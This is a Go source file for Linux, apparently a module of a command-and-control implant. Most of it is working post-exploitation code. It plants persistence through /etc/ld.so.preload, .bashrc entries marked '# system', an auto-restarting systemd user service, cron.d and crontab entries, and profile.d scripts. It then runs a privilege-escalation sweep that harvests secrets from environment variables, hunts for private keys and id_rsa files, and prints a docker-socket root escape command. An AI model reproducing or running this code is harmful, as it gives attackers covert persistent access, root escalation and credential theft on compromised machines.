//go:build linux

package main

// Linux-native Phase 9 capabilities:
//   - LD_PRELOAD persistence, systemd user service, cron.d, profile.d, bashrc
//   - Privilege escalation audit (SUID, sudo, capabilities, docker, /etc/passwd)

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// ── Persistence ───────────────────────────────────────────────────────────────

// linuxPersistLD writes the agent's .so path to /etc/ld.so.preload (root required).
// For user-level: appends LD_PRELOAD=<soPath> to ~/.bashrc instead.
func linuxPersistLD(soPath string) (string, error) {
	preload := "/etc/ld.so.preload"
	if os.Getuid() == 0 {
		data, _ := os.ReadFile(preload)
		if !strings.Contains(string(data), soPath) {
			f, err := os.OpenFile(preload, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				return "", fmt.Errorf("open %s: %w", preload, err)
			}
			fmt.Fprintln(f, soPath)
			f.Close()
		}
		return fmt.Sprintf("[+] LD_PRELOAD: %s added to %s", soPath, preload), nil
	}
	// Fallback: user-level via .bashrc
	return linuxPersistBashrc(fmt.Sprintf("export LD_PRELOAD=%s", soPath))
}

// linuxPersistBashrc appends a line to ~/.bashrc (survives interactive shell restarts).
func linuxPersistBashrc(cmd string) (string, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return "", fmt.Errorf("home dir: %w", err)
	}
	rc := filepath.Join(home, ".bashrc")
	data, _ := os.ReadFile(rc)
	if strings.Contains(string(data), cmd) {
		return "[*] .bashrc already contains the entry", nil
	}
	f, err := os.OpenFile(rc, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return "", fmt.Errorf("open .bashrc: %w", err)
	}
	defer f.Close()
	fmt.Fprintf(f, "\n# system\n%s\n", cmd)
	return fmt.Sprintf("[+] appended to %s: %s", rc, cmd), nil
}

// linuxPersistSystemd installs a systemd user service that runs on login.
func linuxPersistSystemd(name, cmd string) (string, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return "", fmt.Errorf("home dir: %w", err)
	}
	svcDir := filepath.Join(home, ".config", "systemd", "user")
	if err := os.MkdirAll(svcDir, 0755); err != nil {
		return "", fmt.Errorf("mkdir systemd dir: %w", err)
	}
	svcPath := filepath.Join(svcDir, name+".service")
	unit := fmt.Sprintf(`[Unit]
Description=%s

[Service]
ExecStart=%s
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
`, name, cmd)
	if err := os.WriteFile(svcPath, []byte(unit), 0644); err != nil {
		return "", fmt.Errorf("write service file: %w", err)
	}
	// Enable via systemctl --user (best-effort)
	executeShell("systemctl --user daemon-reload 2>/dev/null")
	executeShell(fmt.Sprintf("systemctl --user enable %s 2>/dev/null", name))
	executeShell(fmt.Sprintf("systemctl --user start %s 2>/dev/null", name))
	return fmt.Sprintf("[+] systemd user service installed: %s", svcPath), nil
}

// linuxPersistCronD writes to /etc/cron.d/<name> (root required).
// Falls back to user crontab if non-root.
func linuxPersistCronD(name, cronExpr, cmd string) (string, error) {
	if os.Getuid() == 0 {
		entry := fmt.Sprintf("%s root %s\n", cronExpr, cmd)
		path := filepath.Join("/etc/cron.d", name)
		if err := os.WriteFile(path, []byte(entry), 0644); err != nil {
			return "", fmt.Errorf("write cron.d: %w", err)
		}
		return fmt.Sprintf("[+] /etc/cron.d/%s written: %s %s", name, cronExpr, cmd), nil
	}
	// User crontab fallback
	line := fmt.Sprintf("%s %s", cronExpr, cmd)
	out, err := executeShell(fmt.Sprintf(`(crontab -l 2>/dev/null; echo '%s') | crontab -`, line))
	if err != nil {
		return out, fmt.Errorf("crontab: %w", err)
	}
	return fmt.Sprintf("[+] user crontab entry added: %s", line), nil
}

// linuxPersistProfileD writes /etc/profile.d/<name>.sh (root required).
func linuxPersistProfileD(name, cmd string) (string, error) {
	if os.Getuid() != 0 {
		return "", fmt.Errorf("/etc/profile.d requires root — use linux-persist-bashrc for user-level")
	}
	script := fmt.Sprintf("#!/bin/sh\n%s &\n", cmd)
	path := filepath.Join("/etc/profile.d", name+".sh")
	if err := os.WriteFile(path, []byte(script), 0755); err != nil {
		return "", fmt.Errorf("write profile.d: %w", err)
	}
	return fmt.Sprintf("[+] /etc/profile.d/%s.sh installed (executes on every login shell)", name), nil
}

// linuxPersistList shows installed Linux persistence.
func linuxPersistList() (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Linux Persistence Summary\n")
	sb.WriteString(strings.Repeat("─", 40) + "\n\n")

	home, _ := os.UserHomeDir()

	// systemd user services
	svcDir := filepath.Join(home, ".config", "systemd", "user")
	entries, _ := os.ReadDir(svcDir)
	sb.WriteString("[systemd user services]\n")
	if len(entries) == 0 {
		sb.WriteString("  (none)\n")
	}
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".service") {
			sb.WriteString("  " + e.Name() + "\n")
		}
	}

	// User crontab
	sb.WriteString("\n[crontab]\n")
	out, _ := executeShell("crontab -l 2>/dev/null")
	if strings.TrimSpace(out) == "" {
		sb.WriteString("  (empty)\n")
	} else {
		for _, ln := range strings.Split(strings.TrimSpace(out), "\n") {
			sb.WriteString("  " + ln + "\n")
		}
	}

	// .bashrc
	rc := filepath.Join(home, ".bashrc")
	data, _ := os.ReadFile(rc)
	sb.WriteString("\n[.bashrc tail]\n")
	lines := strings.Split(string(data), "\n")
	start := len(lines) - 10
	if start < 0 {
		start = 0
	}
	for _, ln := range lines[start:] {
		sb.WriteString("  " + ln + "\n")
	}

	// /etc/ld.so.preload
	preload, _ := os.ReadFile("/etc/ld.so.preload")
	sb.WriteString("\n[/etc/ld.so.preload]\n")
	if len(preload) == 0 {
		sb.WriteString("  (empty)\n")
	} else {
		sb.WriteString("  " + strings.TrimSpace(string(preload)) + "\n")
	}

	// /etc/cron.d
	cronEntries, _ := os.ReadDir("/etc/cron.d")
	sb.WriteString("\n[/etc/cron.d]\n")
	for _, e := range cronEntries {
		sb.WriteString("  " + e.Name() + "\n")
	}

	return sb.String(), nil
}

// linuxPersistRemove removes a persistence entry by mechanism (ld|bashrc|systemd|crond|profiled).
func linuxPersistRemove(mech, name string) (string, error) {
	home, _ := os.UserHomeDir()
	switch strings.ToLower(mech) {
	case "systemd":
		executeShell(fmt.Sprintf("systemctl --user stop %s 2>/dev/null", name))
		executeShell(fmt.Sprintf("systemctl --user disable %s 2>/dev/null", name))
		path := filepath.Join(home, ".config", "systemd", "user", name+".service")
		if err := os.Remove(path); err != nil {
			return "", fmt.Errorf("remove %s: %w", path, err)
		}
		return fmt.Sprintf("[+] systemd service %s removed", name), nil
	case "crond":
		path := filepath.Join("/etc/cron.d", name)
		if err := os.Remove(path); err != nil {
			return "", fmt.Errorf("remove %s: %w", path, err)
		}
		return fmt.Sprintf("[+] /etc/cron.d/%s removed", name), nil
	case "profiled":
		path := filepath.Join("/etc/profile.d", name+".sh")
		if err := os.Remove(path); err != nil {
			return "", fmt.Errorf("remove %s: %w", path, err)
		}
		return fmt.Sprintf("[+] /etc/profile.d/%s.sh removed", name), nil
	case "ld":
		path := "/etc/ld.so.preload"
		data, _ := os.ReadFile(path)
		var filtered []string
		for _, ln := range strings.Split(string(data), "\n") {
			if !strings.Contains(ln, name) {
				filtered = append(filtered, ln)
			}
		}
		os.WriteFile(path, []byte(strings.Join(filtered, "\n")), 0644)
		return fmt.Sprintf("[+] ld.so.preload entry %s removed", name), nil
	case "bashrc":
		rc := filepath.Join(home, ".bashrc")
		data, _ := os.ReadFile(rc)
		var filtered []string
		for _, ln := range strings.Split(string(data), "\n") {
			if !strings.Contains(ln, name) {
				filtered = append(filtered, ln)
			}
		}
		os.WriteFile(rc, []byte(strings.Join(filtered, "\n")), 0644)
		return fmt.Sprintf("[+] .bashrc entry containing %q removed", name), nil
	default:
		return "", fmt.Errorf("unknown mech %q (ld|bashrc|systemd|crond|profiled)", mech)
	}
}

// ── Privilege Escalation ───────────────────────────────────────────────────────

func linuxPrivescCheck() (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Linux Privilege Escalation Audit\n")
	sb.WriteString(strings.Repeat("─", 48) + "\n\n")
	sb.WriteString(fmt.Sprintf("Identity: uid=%d euid=%d gid=%d\n\n", os.Getuid(), os.Geteuid(), os.Getgid()))

	type check struct {
		label string
		cmd   string
	}
	checks := []check{
		{"[sudo -l]", "sudo -l -n 2>&1"},
		{"[SUID binaries]", "find / -perm -4000 -type f 2>/dev/null | head -25"},
		{"[SGID binaries]", "find / -perm -2000 -type f 2>/dev/null | head -10"},
		{"[File capabilities]", "getcap -r / 2>/dev/null | head -20"},
		{"[Writable /etc]", "find /etc -maxdepth 2 -writable -type f 2>/dev/null"},
		{"[Cron jobs]", "ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null | head -20"},
		{"[/etc/passwd writable]", "test -w /etc/passwd && echo WRITABLE || echo not writable"},
		{"[Env secrets]", "env 2>/dev/null | grep -iE 'pass|secret|token|api.?key|aws' | head -10"},
		{"[Network listeners]", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -15"},
		{"[Interesting files]", "find /home /root /tmp /var/tmp -name '*.pem' -o -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -10"},
	}

	for _, c := range checks {
		sb.WriteString(c.label + "\n")
		out, _ := executeShell(c.cmd)
		if strings.TrimSpace(out) == "" {
			sb.WriteString("  (none)\n")
		} else {
			for _, ln := range strings.Split(strings.TrimRight(out, "\n"), "\n") {
				sb.WriteString("  " + ln + "\n")
			}
		}
		sb.WriteString("\n")
	}

	// Docker socket
	if _, err := os.Stat("/var/run/docker.sock"); err == nil {
		sb.WriteString("[!!!] /var/run/docker.sock accessible\n")
		sb.WriteString("  Escalate: docker run -v /:/host --rm -it alpine chroot /host sh\n\n")
	}
	// LXD
	if out, _ := executeShell("id"); strings.Contains(out, "lxd") {
		sb.WriteString("[!!!] User is in lxd group — container escape possible\n\n")
	}

	return sb.String(), nil
}
